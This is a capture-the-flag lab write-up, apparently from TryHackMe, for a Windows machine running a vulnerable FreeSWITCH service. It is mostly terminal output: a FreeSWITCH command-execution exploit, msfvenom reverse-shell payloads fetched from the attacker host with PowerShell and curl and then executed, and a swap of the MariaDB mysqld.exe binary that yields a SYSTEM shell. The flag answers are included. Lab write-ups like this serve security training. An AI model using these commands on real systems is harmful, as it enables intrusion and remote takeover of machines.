# Task 1 Flags
----

>>What are the flags?

>>This machine may be slower than normal to boot up and carry out operations.

```bash
┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ nmap -sC -sV -Pn 10.10.62.145
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-26 01:44 EST
Nmap scan report for 10.10.62.145
Host is up (0.30s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE          VERSION
3389/tcp open  ms-wbt-server    Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: WIN-EOM4PK0578N
|   NetBIOS_Domain_Name: WIN-EOM4PK0578N
|   NetBIOS_Computer_Name: WIN-EOM4PK0578N
|   DNS_Domain_Name: WIN-EOM4PK0578N
|   DNS_Computer_Name: WIN-EOM4PK0578N
|   Product_Version: 10.0.17763
|_  System_Time: 2022-02-26T06:42:50+00:00
| ssl-cert: Subject: commonName=WIN-EOM4PK0578N
| Not valid before: 2021-11-08T16:47:35
|_Not valid after:  2022-05-10T16:47:35
|_ssl-date: 2022-02-26T06:42:53+00:00; -2m44s from scanner time.
8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -2m44s, deviation: 0s, median: -2m44s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.62 seconds

┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ searchsploit -m windows/remote/47799.txt
  Exploit: FreeSWITCH 1.10.1 - Command Execution
      URL: https://www.exploit-db.com/exploits/47799
     Path: /usr/share/exploitdb/exploits/windows/remote/47799.txt
File Type: Python script, ASCII text executable

Copied to: /home/rawbot/47799.txt
                                                                                                                                                                                                                                                     
┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ mv 47799.txt exploit.py       

┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ python3 exploit.py    
Missing arguments
Usage: freeswitch-exploit.py <target> <cmd>
                                                                                                                             
┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ python3 exploit.py 10.10.62.145 whoami
Authenticated
Content-Type: api/response
Content-Length: 25

win-eom4pk0578n\nekrotic

┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ msfvenom -p windows/shell_reverse_tcp LHOST=10.9.2.193 LPORT=7007 -f exe > shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes

# Hosting a python3 server to inject the payload.

┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ python3 -m http.server             
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.62.145 - - [26/Feb/2022 01:59:31] "GET /shell.exe HTTP/1.1" 200 -

# Running the exploit

┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ python3 exploit.py 10.10.62.145 "powershell.exe Invoke-WebRequest -Uri http://10.9.2.193:8000/shell.exe -OutFile ./shell.exe && .\shell.exe"
Authenticated

# Got the shell

┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ nc -lvnp 7007
listening on [any] 7007 ...
connect to [10.9.2.193] from (UNKNOWN) [10.10.62.145] 49844
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Program Files\FreeSWITCH>
C:\Users\Nekrotic>cd Desktop
cd Desktop

C:\Users\Nekrotic\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 84FD-2CC9

 Directory of C:\Users\Nekrotic\Desktop

09/11/2021  07:39    <DIR>          .
09/11/2021  07:39    <DIR>          ..
09/11/2021  07:39                38 root.txt
09/11/2021  07:39                38 user.txt
               2 File(s)             76 bytes
               2 Dir(s)  50,487,164,928 bytes free

C:\Users\Nekrotic\Desktop>type user.txt
type user.txt
THM{64bca0843d535fa73eecdc59d27cbe26} 

# Privesc using msfvenom payload

┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ msfvenom -p windows/shell_reverse_tcp LHOST=10.9.2.193 LPORT=4444 -f exe > mysqld.exe 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes

┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ python3 -m http.server       
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.62.145 - - [26/Feb/2022 02:20:18] "GET /mysqld.exe HTTP/1.1" 200 -

C:\Users\Nekrotic\Desktop>cd C:\projects\openclinic\mariadb\bin 
cd C:\projects\openclinic\mariadb\bin 

C:\projects\openclinic\mariadb\bin>ren "mysqld.exe" "mysqld_bak.exe" 
ren "mysqld.exe" "mysqld_bak.exe" 

C:\projects\openclinic\mariadb\bin>curl http://10.9.2.193:8000/mysqld.exe -o "C:\projects\openclinic\mariadb\bin\mysqld.exe"     
curl http://10.9.2.193:8000/mysqld.exe -o "C:\projects\openclinic\mariadb\bin\mysqld.ex
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 73802  100 73802    0     0  73802      0  0:00:01  0:00:01 --:--:-- 39028

C:\projects\openclinic\mariadb\bin>shutdown /r /t 1 
shutdown /r /t 1 

nc -lvnp 4444
listening on [any] 4444 ...
10.10.62.145: inverse host lookup failed: Unknown host
connect to [10.9.2.193] from (UNKNOWN) [10.10.62.145] 49670
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
C:\Users\Nekrotic\Desktop>type root.txt
type root.txt
THM{8c8bc5558f0f3f8060d00ca231a9fb5e}
```

----

# ANSWER THE QUESTIONS
----

1.What is the user.txt flag?
>>THM{64bca0843d535fa73eecdc59d27cbe26} 

2.What is the root.txt flag?
>>THM{8c8bc5558f0f3f8060d00ca231a9fb5e}

----